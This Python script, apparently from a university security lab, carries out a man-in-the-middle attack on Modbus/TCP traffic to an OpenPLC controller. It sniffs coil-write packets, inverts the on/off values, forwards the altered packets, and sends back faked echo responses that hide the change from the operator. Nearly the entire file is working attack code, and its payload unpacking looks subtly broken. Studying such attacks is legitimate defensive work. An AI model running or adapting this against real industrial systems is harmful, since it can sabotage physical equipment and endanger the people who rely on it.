#!/usr/bin/env python3
"""
file:       modbus_hijack.py
author:     Chris Tremblay <cst1465@rit.edu>
language:   Python3
date:       02/09/2023, National Pizza Day!
description:
    This reads and writes to a coil
"""

import time
from pymodbus.client.sync import ModbusTcpClient as ModbusClient
from scapy.all import *
import struct
import arp_spoof

OPEN_PLC_IP = "192.168.1.35"

# MODBUS function code
FC_READ_COIL    = 1
FC_DISCREET_IN  = 2
FC_SINGLE_COIL  = 5

# MODBUS output values
OUT_ON = 0xFF00
OUT_OFF = 0x0000

# address of modbus device
OPENPLC_ADDR = "192.168.1.35"
OPENPLC_PORT = 502
IX100_0 = 800
IX100_1 = 801
IX100_2 = 802
IX100_3 = 803
IX100_4 = 804
IX100_5 = 805
IX100_6 = 806
IX100_7 = 807

# maps a transaction id -> proper response 
# this is needed to distinguish between requests and responses
STATE_DICT = dict()

# packet filter 
#FILTER = "host %s and port 502" % OPEN_PLC_IP # filter by plc host and mbtcp port
FILTER = "port 502"
def packet_handler( pkt ):
    """
    description:
        the function that handles what to do with a packet
    parameters:
        packet -> the packet recieved
    """
    # check if packet has paylaod
    try:
        pkt[Raw].load
    except Exception as e :
        return
    # deconstruct modbus payload
    trans_id, proto_id, length, unit_id,func_code, = \
            struct.unpack( "!HHHBB", pkt[Raw].load[:8] )

    # check if function code is write single coil
    if( func_code == FC_SINGLE_COIL ):
        pkt.show()
        out_addr, out_val = struct.unpack( "!HH", pkt[Raw].load[8:13] )
        print( '-'*20, "sniffed packet", '-'*20 )
        print( "trans_id", trans_id )
        print( "proto_id:", proto_id )
        print( "length:", length )
        print( "unit_id:", unit_id )
        print( "func_code:", func_code )    
        print( "out_addr:", out_addr )
        print( "out_val:", hex( out_val ) )
        print( '-' * 56, '\n' )

        malicous_load = None
        if( not trans_id in STATE_DICT ): 
            print( "creating state dict entry")
            STATE_DICT[trans_id] = pkt[Raw].load

            # change on/off request to the opposite
            spoof_data = None
            if( out_val == OUT_ON ):
                print( "detected turn coil on, spoofing off")
                spoof_data = OUT_OFF
            else:
                print( "detected turn coil off, spoofing on")
                spoof_data = OUT_ON

            # convery bytes to bytearray, and manipulate load
            ar = bytearray( pkt[Raw].load )
            ar[8:13] = struct.pack( "!HH", out_addr, spoof_data )
            pkt[Raw].load = bytes( ar )
        else:
            print( "state dict entry already exists" )
            # echo original request back as response
            pkt[Raw].load = STATE_DICT.pop( trans_id )

        # get actual destination MAC addr
        mac = arp_spoof.get_mac( pkt[IP].dst )
        print( "real mac", mac )
        pkt[Ether].dst = mac
        pkt.show()
        send( pkt )

    # packet isn't a write request
    else:
        send( pkt )
    return

def modbus_hijack():
    """
    description:
        The modbus hijack attack
        starts sniffing for packets and when a write coil modbus
        packet is found, it will change the value to be the opposite
        (on -> off, off -> on) and forward it 
    """
    # sniff time
    pkts = sniff( prn=packet_handler, filter=FILTER )
    """
    pkts = sniff( offline="modbus.pcap", handler=packet_handler, filter=FILTER )
    for pkt in pkts:
        print( "summary:", pkt.summary() )
    """
    return

def main():
    """
    description:
        the driver function 
    """
    # connect to PLC
    client = ModbusClient( OPENPLC_ADDR, port=OPENPLC_PORT )
    client.connect()
    print( client )

    rr = client.read_coils( IX100_0 )
    print( rr )
    for i in range( len( rr.bits ) ):
        print( rr.bits[i] )
    print()

    client.write_coil( IX100_6, True, unit=1 )
    client.read_coils( IX100_0 )
    for i in range( len( rr.bits ) ):
        print( rr.bits[i] )
    print()

    client.close()  
    return

if( __name__ == "__main__" ):
    main()